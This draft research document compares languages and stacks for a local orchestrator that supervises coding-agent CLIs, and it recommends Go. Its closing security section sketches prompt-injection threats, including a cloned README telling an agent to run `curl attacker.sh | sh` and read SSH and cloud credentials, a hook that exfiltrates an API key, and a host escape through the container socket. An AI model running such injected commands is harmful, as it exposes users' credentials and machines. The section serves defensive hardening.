---
title: Research: orchestrator language and stack
status: draft
date: 2026-10-10
related: []
style: research
---

# Stack options for a local AI "software factory" orchestrator

Research date: 2026-10-10. Repo languages come from the GitHub REST API (`language` field) unless noted otherwise. Where the API was rate-limited, the language was confirmed from the manifest file in the repo (`go.mod`, `Cargo.toml`, `mix.exs`, `package.json`). Star counts and versions are as of the research date.

**Bottom line.** Go is the best fit for this orchestrator as specified. The design drives agent CLIs as subprocesses and keeps state in files and git. Go's main gap is the vendor agent SDKs (no Claude Agent SDK or OpenAI Agents SDK), and that design does not need them. Most open-source multi-agent orchestrators of this exact kind are written in Go: Gas Town, Beads, Claude Squad, Crush, container-use, Dagger and AgentAPI. Go also has official Anthropic, OpenAI, MCP, Temporal and Podman libraries. TypeScript is the runner-up: it has the richest agent SDK coverage, and Claude Code, OpenCode and Gemini CLI are written in it. Elixir has the best runtime model but the weakest SDK coverage. The JVM option is credible only with Java plus Pekko.

---

## 1. What real tools are written in

| Tool | Category | Language (verified) | Notes / stated reasons |
|---|---|---|---|
| Claude Code | coding-agent CLI | TypeScript (React + Ink, built with Bun) | Chosen to be "on distribution", so that "Claude Code could build itself" ([Pragmatic Engineer](https://newsletter.pragmaticengineer.com/p/how-claude-code-is-built)). Anthropic acquired Bun in Dec 2025, and that work "drove the recent launch of Claude Code's native installer" ([Anthropic](https://www.anthropic.com/news/anthropic-acquires-bun-as-claude-code-reaches-usd1b-milestone)). The public repo shows TypeScript ([GitHub](https://github.com/anthropics/claude-code)). |
| Codex CLI | coding-agent CLI | Rust | Rewritten from TS/Node to Rust (May 2025) for a zero-dependency install (no Node 22 requirement), native sandbox bindings, no GC (lower memory) and an extensible wire protocol ([discussion #1174](https://github.com/openai/codex/discussions/1174); [repo](https://github.com/openai/codex)). |
| OpenCode | coding-agent CLI + server | TypeScript (Bun) | Repo moved from sst/opencode to [anomalyco/opencode](https://github.com/anomalyco/opencode). It has `bun.lock`/`bunfig.toml`, a headless `opencode run --format json` and an HTTP `opencode serve` ([docs](https://opencode.ai/docs/cli/)). |
| Crush (Charm) | coding-agent CLI | Go | Built on the Charm ecosystem. Supports OpenAI- and Anthropic-compatible APIs and OpenRouter ([repo](https://github.com/charmbracelet/crush)). |
| Aider | coding-agent CLI | Python | [repo](https://github.com/Aider-AI/aider) |
| Goose | agent CLI/desktop | Rust | Repo moved from block/goose to [aaif-goose/goose](https://github.com/aaif-goose/goose). |
| Gemini CLI | coding-agent CLI | TypeScript | [repo](https://github.com/google-gemini/gemini-cli) |
| Amp (Sourcegraph) | coding-agent CLI | Closed source; language not public | The npm package `@sourcegraph/amp` is now a stub, renamed to `@ampcode/cli`, whose bin is a native executable ([npm](https://registry.npmjs.org/@sourcegraph/amp/latest)). |
| Gas Town (Yegge) | multi-agent orchestrator | Go | Uses tmux, git worktrees, Beads and Dolt. It drives Claude Code, Codex, Gemini, Amp, OpenCode and others ([repo](https://github.com/gastownhall/gastown)). |
| Beads (Yegge) | git-backed agent issue tracker | Go | [repo](https://github.com/gastownhall/beads) |
| StrongDM Attractor | software-factory agent spec | **No code**: natural-language specs only | Ships "NLSpecs to build your own version of Attractor" ([repo](https://github.com/strongdm/attractor)). Factory principles are on the [StrongDM factory page](https://factory.strongdm.ai/). |
| Sculptor (Imbue) | parallel-agent desktop app | Python (+ Electron shell) | Runs Claude Code and the Pi harness. The Docker backend is experimental ([repo](https://github.com/imbue-ai/sculptor)). |
| Conductor | parallel-agent Mac app | Closed source; language not stated | Runs Claude Code, Codex and Cursor in isolated workspaces ([site](https://www.conductor.build/)). |
| Vibe Kanban | agent kanban | Rust backend + TS frontend | The project is **sunsetting** ([repo](https://github.com/BloopAI/vibe-kanban)). |
| Claude Squad | parallel-agent TUI | Go | Uses tmux and git worktrees ([repo](https://github.com/smtg-ai/claude-squad)). |
| container-use (Dagger) | containerized agent envs (MCP) | Go | "Each agent gets a fresh container in its own git branch" ([repo](https://github.com/dagger/container-use)). |
| AgentAPI (Coder) | HTTP API over agent CLIs | Go | Now **deprecated** ([repo](https://github.com/coder/agentapi)). |
| Dagger | container automation engine | Go | [repo](https://github.com/dagger/dagger) |
| Temporal (server) | durable workflow engine | Go | [repo](https://github.com/temporalio/temporal) |
| Inngest (server) / AgentKit | workflow engine / agent lib | Go / TypeScript | [inngest](https://github.com/inngest/inngest), [agent-kit](https://github.com/inngest/agent-kit) |
| LangGraph | agent graph framework | Python | [repo](https://github.com/langchain-ai/langgraph) |
| Mastra | agent framework | TypeScript | [repo](https://github.com/mastra-ai/mastra) |
| Pydantic AI | agent framework | Python | Integrates Temporal, DBOS, Prefect and Restate for durable execution ([docs](https://pydantic.dev/docs/ai/integrations/durable_execution/overview/)). |
| Ralph (original) | technique | Bash loop: `while :; do cat PROMPT.md \| claude-code ; done` | ([ghuntley](https://ghuntley.com/ralph/)) |
| snarktank/ralph | Ralph implementation | `ralph.sh` bash loop; GitHub reports TS | State lives in git, `progress.txt` and `prd.json` ([repo](https://github.com/snarktank/ralph)). |
| ralph-orchestrator | Ralph implementation | Rust | [repo](https://github.com/mikeyobrien/ralph-orchestrator) |
| Google ADK-Go, CloudWeGo Eino, LangChainGo | Go agent frameworks | Go (`go.mod`) | [adk-go](https://github.com/google/adk-go), [eino](https://github.com/cloudwego/eino), [langchaingo](https://github.com/tmc/langchaingo) |
| Rig | Rust LLM framework | Rust | [repo](https://github.com/0xPlaygrounds/rig) |
| Jido / ReqLLM / LangChain (Elixir) | Elixir agent framework / LLM client | Elixir (`mix.exs`) | [jido](https://github.com/agentjido/jido) (hex 2.4.0), [req_llm](https://github.com/agentjido/req_llm) (v1.x; Anthropic, OpenAI and OpenRouter), [brainlid/langchain](https://github.com/brainlid/langchain) |
| Koog (JetBrains) / LangChain4j | JVM agent frameworks | Kotlin / Java | Covered in section 4.6. |
| Akka SDK | "Agentic AI Platform for Enterprises" | Java (Akka, BSL) | Covered in section 4.6. |

**Pattern.** The vendor agent CLIs are TypeScript (Anthropic, Google, OpenCode) or Rust (OpenAI, Goose). The orchestrators that sit on top of those CLIs and supervise processes, worktrees and containers are mostly **Go**: Gas Town, Claude Squad, container-use, AgentAPI and Dagger.

All the major CLIs support headless use, so the orchestrator never has to link a vendor SDK:
- `claude -p --output-format json|stream-json`. The JSON output includes `total_cost_usd`, and runs can be continued with `--resume <id>`. SIGTERM exits with code 143 and kills Bash process trees ([docs](https://code.claude.com/docs/en/headless)).
- `codex exec --json` prints a JSONL event stream and supports `codex exec resume <id>` ([docs](https://learn.chatgpt.com/docs/non-interactive-mode)).
- `opencode run --format json` ([docs](https://opencode.ai/docs/cli/)).

The Claude docs explicitly recommend running the CLI as a subprocess when you work outside Python or TypeScript ([Agent SDK overview](https://code.claude.com/docs/en/agent-sdk/overview)).

---

## 2. SDK availability by language

| SDK | Go | TS | Python | Rust | Elixir | JVM |
|---|---|---|---|---|---|---|
| Claude Agent SDK | no | **yes** | **yes** | no | no | no |
| Anthropic API SDK (official) | **yes** | yes | yes | **no** | no | Java yes |
| OpenAI API SDK (official) | yes (docs say beta) | yes | yes | **no** | no | Java yes (beta) |
| OpenAI Agents SDK | no | yes | yes | no | no | no |
| OpenRouter (OpenAI-compatible) | via openai-go | official `@openrouter/sdk` + OpenAI SDK | official `openrouter` + OpenAI SDK | via async-openai (community) | ReqLLM (community) | via openai-java |
| MCP SDK (official tier) | **Tier 1** | Tier 1 | Tier 1 | Tier 1 | **none** (community: anubis_mcp, hermes_mcp) | Java Tier 2, Kotlin Tier 3 |
| Temporal SDK | yes | yes | yes | yes | **none** | Java yes |
| Container client | Podman Go bindings, Docker go-sdk, testcontainers-go | dockerode | docker-py, podman-py | bollard | none maintained (HTTP to socket) | docker-java, Testcontainers |
| TUI | Bubble Tea | Ink | Textual | Ratatui | weak | Lanterna, Mosaic (experimental) |

Sources:
- **Claude Agent SDK:** "programmable in Python and TypeScript" ([docs](https://code.claude.com/docs/en/agent-sdk/overview)).
- **Anthropic client SDKs:** "Python, TypeScript, C#, Go, Java, PHP, and Ruby", so there is no official Rust SDK ([docs](https://platform.claude.com/docs/en/cli-sdks-libraries/overview); [anthropic-sdk-go](https://github.com/anthropics/anthropic-sdk-go); [anthropic-sdk-java](https://github.com/anthropics/anthropic-sdk-java), Maven 2.71.0).
- **OpenAI:** official SDKs are JS/TS, Python, .NET, Java (beta), Go (beta) and Ruby. The Agents SDK is TS and Python only ([docs](https://developers.openai.com/api/docs/libraries); [openai-go](https://github.com/openai/openai-go); [openai-java](https://github.com/openai/openai-java), Maven 4.80.0; [agents-python](https://github.com/openai/openai-agents-python); [agents-js](https://github.com/openai/openai-agents-js)).
- **OpenRouter:** "use the OpenAI SDK pointed at OpenRouter as a drop-in replacement" (`base_url=https://openrouter.ai/api/v1`). Official SDKs exist for TS and Python ([docs](https://openrouter.ai/docs/quickstart)).
- **MCP tiers:** [modelcontextprotocol.io/docs/sdk](https://modelcontextprotocol.io/docs/sdk). The Go SDK is "maintained in collaboration with Google" ([repo](https://github.com/modelcontextprotocol/go-sdk)). For Elixir: [anubis_mcp](https://hex.pm/packages/anubis_mcp).
- **Temporal:** Go, Java, Python, TypeScript, .NET, Ruby, PHP and Rust ([docs](https://docs.temporal.io/encyclopedia/temporal-sdks)).
- **Containers:**
  - Podman serves a Docker v1.40-compatible API plus a native Libpod API ([docs](https://docs.podman.io/en/latest/markdown/podman-system-service.1.html)), so any Docker client works against a Podman socket.
  - Podman Go bindings: [README](https://github.com/containers/podman/blob/main/pkg/bindings/README.md).
  - Other clients: [docker go-sdk](https://github.com/docker/go-sdk), [testcontainers-go](https://github.com/testcontainers/testcontainers-go), [dockerode](https://github.com/apocas/dockerode), [docker-py](https://github.com/docker/docker-py), [podman-py](https://github.com/containers/podman-py), [bollard](https://github.com/fussybeaver/bollard) (crates.io 0.21.1) and [docker-java](https://github.com/docker-java/docker-java).
- **Rust community crates:** [async-openai](https://github.com/64bit/async-openai) is at 0.42.2. The only `anthropic-sdk` crate is unofficial and was last updated in 2024 (crates.io API).
- **TUIs:** [Bubble Tea](https://github.com/charmbracelet/bubbletea), [Ink](https://github.com/vadimdemedes/ink), [Textual](https://textual.textualize.io/) (which also serves to a browser), [Ratatui](https://ratatui.rs/), [Lanterna](https://github.com/mabe02/lanterna) and [Mosaic](https://github.com/jakewharton/mosaic) ("experimental").

### SDK gaps per language
- **Go:** no Claude Agent SDK and no OpenAI Agents SDK. Everything else is official: the Anthropic, OpenAI, MCP (Tier 1) and Temporal SDKs, plus the Podman bindings.
- **TypeScript:** no real gaps. It is the best-covered language.
- **Python:** no real gaps. It ties with TypeScript and has the most agent frameworks.
- **Rust:** no official Anthropic or OpenAI SDK and no agent SDKs. It does have official MCP (Tier 1) and Temporal SDKs.
- **Elixir:** no official SDK for anything listed: Anthropic, OpenAI, MCP, Temporal or containers. You depend on community packages (ReqLLM, Jido, anubis_mcp).
- **JVM:** no Claude Agent SDK or OpenAI Agents SDK. It has official Anthropic Java, OpenAI Java (beta), MCP Java (Tier 2) and Kotlin (Tier 3), and Temporal Java SDKs, plus Koog and LangChain4j.

---

## 3. Comparison table

Scores run from 1 to 5, where 5 is best for this orchestrator. Sections 4.1 to 4.6 give the evidence behind each cell.

| Criterion | Go | TypeScript (Node/Bun) | Python | Rust | Elixir/BEAM | JVM: Pekko (Java) |
|---|---|---|---|---|---|---|
| Subprocess supervision & concurrency | 5: goroutines; `exec.CommandContext` + `Cancel`/`WaitDelay` | 3: event loop + `child_process`, single-threaded | 3: asyncio subprocess, GIL | 4: tokio; children **not** killed on drop by default | 5 for supervision trees; 3 for OS processes (ports don't kill children; needs MuonTrap/erlexec) | 4: typed supervision; `ProcessHandle` (Java 9+) kills process trees; virtual threads |
| Durable state / resume | 3: DIY file + git journal, or Temporal/DBOS/Restate Go SDKs | 4: Temporal, Restate, Inngest, Mastra | 5: LangGraph SQLite checkpointer, Pydantic AI + Temporal/DBOS/Prefect/Restate | 3: Temporal and Restate Rust SDKs, otherwise DIY | 4: Oban on SQLite; DIY via OTP | 5: Pekko Persistence event sourcing (JDBC; local snapshot store) + Temporal Java |
| LLM/agent SDK fit | 4 (no agent SDKs, all API/MCP SDKs) | 5 | 5 | 2 | 2 | 4 |
| Single-binary distribution | 5 (native, cross-compile) | 4 (`bun build --compile`, large binary) | 2 (PyInstaller; uv helps dev, not distribution) | 5 | 3 (Burrito, "experimental", self-extracting) | 2–3 (fat JAR + JRE; GraalVM native-image with Pekko not first-class) |
| How well coding agents write it / refactorability | 5 (Ronacher; simple, fast tests, explicit) | 4 (Claude Code chose TS for this reason) | 3 (agents "struggle with Python's magic"; slow loop) | 3 (strong types, slow compiles) | 4 (top AutoCodeBench score; small corpus) | Java 4, Kotlin 4, Scala 3 |
| Learning value | 4 (concurrency, systems) | 3 | 2 (most people know it) | 5 (ownership, async) | 5 (OTP, actors, a new paradigm) | 4 (actors, event sourcing) |
| TUI / web dashboard | 5 (Bubble Tea; `embed` for web) | 5 (Ink; web is native) | 4 (Textual runs in terminal and browser) | 4 (Ratatui) | 5 web (LiveView), 2 TUI | 3 (Lanterna/Mosaic; web via Pekko HTTP) |
| Ecosystem precedent for *this* kind of tool | 5 (Gas Town, Claude Squad, container-use, Crush, AgentAPI) | 4 (Claude Code, OpenCode, Gemini CLI) | 3 (Aider, Sculptor) | 4 (Codex, Goose, Vibe Kanban) | 2 (Jido) | 2 (Akka SDK, enterprise/cloud) |

**Variant (6th option): Go + a workflow engine as the backbone.** This means Temporal, DBOS or Restate under Go.
- **Temporal:** `temporal server start-dev --db-filename x.db` runs locally with SQLite persistence and a web UI at :8233. The dev server is "not intended for production use" ([docs](https://docs.temporal.io/cli/server)).
- **DBOS:** has a Go SDK, but it is Postgres-backed ([repo](https://github.com/dbos-inc/dbos-transact-golang); [docs](https://docs.dbos.dev/)).
- **Restate:** has SDKs for TS, Java, Kotlin, Python, Go, Rust and Ruby ([docs](https://docs.restate.dev/)).
- **Gain:** checkpoint/resume, retries, timers and signals (useful for human approval gates) come for free, plus an event-history UI.
- **Cost:** a second process. Temporal's determinism rules mean agent calls must be Activities. State also moves from "files + git" into the engine's DB, which conflicts with the stated requirement unless the ledger is mirrored to files.
- **Recommendation:** start with a file + git journal (an append-only JSONL run ledger, with a checkpoint per graph node). Keep step execution idempotent so Temporal can replace the journal later if needed.

---

## 4. Per-option detail

### 4.1 Go
- **Process supervision:** `exec.CommandContext` interrupts the process "if the context becomes done", `Cmd.Cancel` overrides the kill, and `WaitDelay` bounds waits on stuck I/O ([pkg.go.dev/os/exec](https://pkg.go.dev/os/exec)). Goroutines and channels fit naturally with fan-out to parallel agents.
- **Agent proficiency:** "I strongly recommend Go for new backend projects." Ronacher's reasons are explicit context passing, fast incremental tests, structural interfaces and a stable ecosystem ([Ronacher, Jun 2025](https://lucumr.pocoo.org/2025/6/12/agentic-coding/)). Counterpoint: on AutoCodeBench's single-shot problems, Go scored 37.2% Pass@1 for Claude Opus 4 versus 40.3% for Python ([arXiv 2508.09101](https://arxiv.org/html/2508.09101)). Problems differ per language, so cross-language comparison is indicative only.
- **Distribution and dashboard:** a native static binary, plus `embed` for bundling a web dashboard ([pkg.go.dev/embed](https://pkg.go.dev/embed)).
- **Precedent:** Gas Town, Beads, Claude Squad, Crush, container-use, Dagger and AgentAPI (section 1).

**Pros:** user preference; best precedent for agent-CLI orchestrators; official Anthropic, OpenAI, MCP, Temporal and Podman libraries; single binary; Bubble Tea.
**Cons:** no vendor agent SDKs (you must parse CLI JSON streams); durable execution is DIY or needs an external engine; fewer LLM frameworks than Python or TS.

### 4.2 TypeScript (Node/Bun)
- **Distribution:** Bun compiles to one executable that bundles "a copy of the Bun runtime", with cross-compile targets for Linux, Windows and macOS. Bun admits binaries are "still way too big" ([Bun docs](https://bun.com/docs/bundler/executables)). Node SEA ([docs](https://nodejs.org/api/single-executable-applications.html)) and `deno compile` ([docs](https://docs.deno.com/runtime/reference/cli/compile/)) are alternatives.
- **SDK coverage:** the Claude Agent SDK, OpenAI Agents SDK, OpenRouter SDK and MCP Tier 1 SDK all exist in TS, along with Temporal, Restate, Inngest AgentKit and Mastra.
- **Agent proficiency:** Claude Code picked TS so the model "could build itself" ([Pragmatic Engineer](https://newsletter.pragmaticengineer.com/p/how-claude-code-is-built)).

**Pros:** richest SDK coverage (it can embed Claude and OpenAI agent loops in-process rather than through a CLI); the same language for the TUI (Ink) and a web dashboard.
**Cons:** single-threaded event loop for CPU work; `child_process` supervision is more manual ([Node docs](https://nodejs.org/api/child_process.html)); large binaries; npm supply-chain surface.

### 4.3 Python
- **Durable state:** LangGraph checkpointers give "human-in-the-loop workflows, time travel, and fault tolerance", and `SqliteSaver` provides local file storage ([docs](https://docs.langchain.com/oss/python/langgraph/persistence)). Pydantic AI co-maintains Temporal, DBOS, Prefect and Restate integrations ([docs](https://pydantic.dev/docs/ai/integrations/durable_execution/overview/)).
- **Subprocesses:** asyncio subprocesses ([docs](https://docs.python.org/3/library/asyncio-subprocess.html)).
- **Agent proficiency:** Ronacher says "Agents struggle with Python's magic" and that the agent loop is slow because of startup time ([Ronacher](https://lucumr.pocoo.org/2025/6/12/agentic-coding/)).
- **Distribution:** PyInstaller bundles an interpreter ([docs](https://pyinstaller.org/en/stable/)).

**Pros:** the most agent frameworks; best out-of-the-box checkpointing (LangGraph); Textual gives a TUI and a browser UI from one codebase.
**Cons:** weakest distribution; runtime type safety is weaker, so refactors are riskier; slower agent loop.

### 4.4 Rust
- **Process supervision:** a tokio `Child` "will, by default, continue to execute even after the Child handle has been dropped". `kill_on_drop` is false by default, and zombies are a known caveat ([docs.rs](https://docs.rs/tokio/latest/tokio/process/struct.Command.html)).
- **SDK coverage:** official MCP (`rmcp` 3.5.1) and Temporal Rust SDKs exist. There are no official Anthropic or OpenAI SDKs.
- **Precedent:** Codex moved to Rust for native sandboxing, no GC and a zero-dependency install ([#1174](https://github.com/openai/codex/discussions/1174)).

**Pros:** best performance and memory use; single binary; Ratatui; strongest compile-time guarantees; high learning value.
**Cons:** LLM SDK gaps; slower iteration and compiles in the agent loop (Ronacher notes `cargo test` friction); overkill for an I/O-bound orchestrator.

### 4.5 Elixir/BEAM
- **Supervision:** OTP supervisors restart failed processes ([Supervisor docs](https://elixir.hexdocs.pm/Supervisor.html)).
- **Caveat on OS processes:** when the VM dies, a port's external program "won't be automatically terminated", and the docs suggest a wrapper script ([Port docs](https://elixir.hexdocs.pm/Port.html)). MuonTrap fixes this: it "kills OS processes if the Elixir process running them crashes" and can apply cgroups ([repo](https://github.com/fhunleth/muontrap)). [erlexec](https://github.com/saleyn/erlexec) is an alternative.
- **Durable state:** Oban jobs run on Postgres, **SQLite3** or MySQL ([docs](https://oban.hexdocs.pm/installation.html)).
- **Distribution:** Burrito builds a self-extracting single binary. It "is still experimental" and needs Zig to build ([repo](https://github.com/burrito-elixir/burrito)).
- **Agent proficiency:** AutoCodeBench reports Elixir with "the highest completion rate across models" among 20 languages; Claude Opus 4 scored 80.3% Pass@1 ([Valim, Feb 2026](https://dashbit.co/blog/why-elixir-best-language-for-ai); [arXiv](https://arxiv.org/html/2508.09101)). Valim notes this measured single-pass generation, not agent workflows.
- **Agent framework:** Jido ([repo](https://github.com/agentjido/jido)).
- **Dashboard:** Phoenix LiveView gives a real-time dashboard with no JavaScript build ([docs](https://hexdocs.pm/phoenix_live_view/welcome.html)).

**Pros:** the runtime model maps one-to-one onto "many supervised agents"; best live web dashboard; high learning value.
**Cons:** no official SDKs at all (section 2); weak TUI; experimental single-binary story; smallest hiring and training corpus.

### 4.6 JVM actor model: Apache Pekko (recommended language: **Java 21+**)

**Licensing**
- **Akka:** Akka switched to BSL 1.1 starting with v2.7 (Sep 2022) ([Akka blog](https://akka.io/blog/lightbend-changes-its-software-licensing-model-for-akka-technology)). The current FAQ says BSL "freely allows usage ... for development and other non-production work". "Production use of Akka requires a commercial license", and each release reverts to Apache 2.0 after three years ([Akka BSL FAQ](https://akka.io/bsl-license-faq)).
- **Akka artifacts:** binaries now come from a tokenized repo (`repo.akka.io/<token>/secure`) ([doc.akka.io](https://doc.akka.io/docs/akka-dependencies/current/)). Recent versions require a license key in production ([discuss.akka.io](https://discuss.akka.io/t/akka-license-key/10972)). Maven Central's last `akka-actor-typed_3` is 2.9.0-M2 from Oct 2024 (maven metadata).
- **Akka positioning:** Akka now markets itself as "the Agentic AI Platform for Enterprises", with an Akka SDK offering Agents, Workflows, Event Sourced Entities and MCP Endpoints in Java ([akka.io](https://akka.io/); [SDK docs](https://doc.akka.io/sdk/index.html)). It is aimed at its own cloud and runtime, not at a local CLI orchestrator.
- **Pekko is the Apache-2.0 fork, and it is active.** Releases on Maven Central: 1.3.0 (2025-11-16), 1.4.0 (2025-12-07), 1.5.0 (2026-03-23), 1.6.0 (2026-04-24), 1.7.0 (2026-08-16), 1.7.1 (2026-09-04). The 2.0.0 milestones are M1 (2025-12) through M4 (2026-08-18) ([Maven Central](https://repo1.maven.org/maven2/org/apache/pekko/pekko-actor-typed_3/); [GitHub](https://github.com/apache/pekko)).

**Typed actors and supervision**
- The default is to stop on exception. `Behaviors.supervise(...).onFailure(SupervisorStrategy.restart())` adds restarts with limits (for example, at most 10 restarts in 10 seconds) ([docs](https://pekko.apache.org/docs/pekko/current/typed/fault-tolerance.html)).
- Children are stopped on parent restart by default.
- The docs show the Java API alongside Scala ([typed docs](https://pekko.apache.org/docs/pekko/current/typed/index.html)). Kotlin is not mentioned.

**Persistence for checkpoint/resume**
- Event-sourced behaviors are a natural fit for a run ledger (every step is an event).
- **Built-in options:** the local LevelDB journal is **deprecated**. A local file snapshot store exists ([plugins](https://pekko.apache.org/docs/pekko/current/persistence-plugins.html)).
- **Recommended path:** pekko-persistence-jdbc, which supports "JDBC-compliant databases" ([docs](https://pekko.apache.org/docs/pekko-persistence-jdbc/current/overview.html)). SQLite would mean using [sqlite-jdbc](https://github.com/xerial/sqlite-jdbc) with a custom schema, because it is not a documented target.
- **Other plugins:** R2DBC, Cassandra and DynamoDB plugins also exist (Maven Central listing).

**Subprocesses:** `ProcessHandle` (Java 9+) provides `descendants()`, `destroy()`/`destroyForcibly()` and `onExit()` as a `CompletableFuture` ([JDK docs](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessHandle.html)). This is the cleanest process-tree kill among the options. Virtual threads make blocking reads of agent stdout cheap ([JEP 444](https://openjdk.org/jeps/444)).

**SDKs and frameworks**
- **Official API and protocol SDKs:**
  - Anthropic Java SDK (2.71.0)
  - OpenAI Java SDK (4.80.0, beta per OpenAI docs)
  - MCP Java SDK (2.0.1, Tier 2)
  - MCP Kotlin SDK (Tier 3)
  - Temporal Java SDK (1.40.0)
- **Agent frameworks:**
  - **Koog** (JetBrains, Apache 2.0, 1.3.0): a "JVM (Java and Kotlin)" framework with graph workflows, checkpoint and restore, MCP, and OpenRouter/Anthropic/OpenAI providers ([repo](https://github.com/JetBrains/koog)).
  - **LangChain4j** (1.22.0): 20+ providers, MCP and agentic modules ([repo](https://github.com/langchain4j/langchain4j)).
- Versions are from Maven Central metadata.

**Startup and distribution**
- **Default:** a JVM fat JAR plus a JRE.
- **GraalVM native-image:** "starts in milliseconds", but it needs reachability metadata for reflection ([GraalVM docs](https://www.graalvm.org/latest/reference-manual/native-image/)).
- **Pekko has no first-class native-image support.** A community PR adding metadata was still under discussion ([pekko notifications archive](https://www.mail-archive.com/notifications@pekko.apache.org/msg26123.html)). Akka (BSL) ships partial metadata ([Akka docs](https://doc.akka.io/libraries/akka-core/current/additional/native-image.html)). Expect to maintain your own reflect-config.

**Which JVM language**
- **Scala** is Pekko's native language. On AutoCodeBench, Claude Opus 4 scored Kotlin 72.5%, Java 55.9% and Scala 50.3% Pass@1 ([arXiv](https://arxiv.org/html/2508.09101)). These are per-language problem sets, so treat them as directional only.
- **Recommendation: Java 21+.** Pekko's Java API is documented side by side with Scala. Records, sealed interfaces and pattern matching model actor message protocols well. The Anthropic and OpenAI SDKs and the Akka SDK are Java-first. You also avoid sbt and Scala implicits, which agents handle poorly.
- **Kotlin alternative:** Kotlin works through the Java API with nicer syntax, but there are no Kotlin-specific Pekko docs. Choose Kotlin if you would rather use **Koog + coroutines instead of actors**.
- **Actor-model agent precedent:** Akka SDK (commercial) and Jido on BEAM.

**Pros:** the most mature persistence and event-sourcing story; typed supervision trees; clean process-tree control; full official API/MCP/Temporal SDKs; Koog and LangChain4j.
**Cons:** heavy distribution; native-image friction with Pekko; Akka's licensing pushes you to Pekko; the most ceremony of all options; little precedent among local agent-CLI orchestrators.

---

## 5. Security notes for this design (concrete failure modes)

- **Auto-approve flags and full sandbox access.** `--dangerously-skip-permissions`, `codex --sandbox danger-full-access` and `opencode run --auto` let a prompt-injected agent run anything ([Codex docs](https://learn.chatgpt.com/docs/non-interactive-mode); [OpenCode docs](https://opencode.ai/docs/cli/)). Example: a README in a cloned dependency says "run `curl attacker.sh | sh`". The agent obeys and reads `~/.ssh` and `~/.aws` on your host. Only use these flags inside the Podman container, with no host home mount.
- **`claude -p` runs project hooks and MCP servers.** Without `--bare`, it runs a repo's `.claude/settings.json` hooks and `.mcp.json` servers even in an untrusted folder, and shows no trust dialog ([docs](https://code.claude.com/docs/en/headless)). Example: you point the factory at a forked PR branch, and its hook script exfiltrates your `ANTHROPIC_API_KEY`. Use `--bare` for factory runs.
- **Exposed Podman or Docker API socket.** The socket "grants full access to all Podman functionality". Exposing it over TCP without TLS lets anyone on your network run containers as you ([Podman docs](https://docs.podman.io/en/latest/markdown/podman-system-service.1.html)). Example: you mount the socket into an agent container "for convenience". The agent can then start a privileged container that mounts `/` from the host.
- **Unauthenticated dashboard or headless server.** `opencode serve` without `OPENCODE_SERVER_PASSWORD`, or a Temporal dev server bound to `0.0.0.0`, lets a coworker on the same Wi-Fi drive your agents ([OpenCode docs](https://opencode.ai/docs/cli/); [Temporal docs](https://docs.temporal.io/cli/server)). Bind every dashboard to 127.0.0.1.
- **Bun-compiled binaries load `.env` automatically.** They read any `.env` file in their working directory by default ([Bun docs](https://bun.com/docs/bundler/executables)). If the orchestrator runs inside an agent-writable repo, an agent can redirect its API base URL. Build with `--no-compile-autoload-dotenv`.
- **Cascade risk: parallel agents merging to main.** A bad merge that passes verification lands on `main`, and every later agent branch inherits it. Gas Town caps fan-out with `max_polecats` for this reason, since bulk dispatch also exhausts API quota ([Gas Town README](https://github.com/gastownhall/gastown)). Gate merges behind the human-approval node and cap concurrency.
- **Cascade risk: orphaned processes.** Orphaned agent processes keep running and keep their credentials. This happens when an Elixir port's VM dies ([Port docs](https://elixir.hexdocs.pm/Port.html)) or a tokio `Child` is dropped ([docs.rs](https://docs.rs/tokio/latest/tokio/process/struct.Command.html)). Ten retried steps can leave ten agents still pushing commits. Always kill the process group: use `Setpgid` + a group kill in Go, `ProcessHandle.descendants()` on the JVM, and MuonTrap in Elixir.
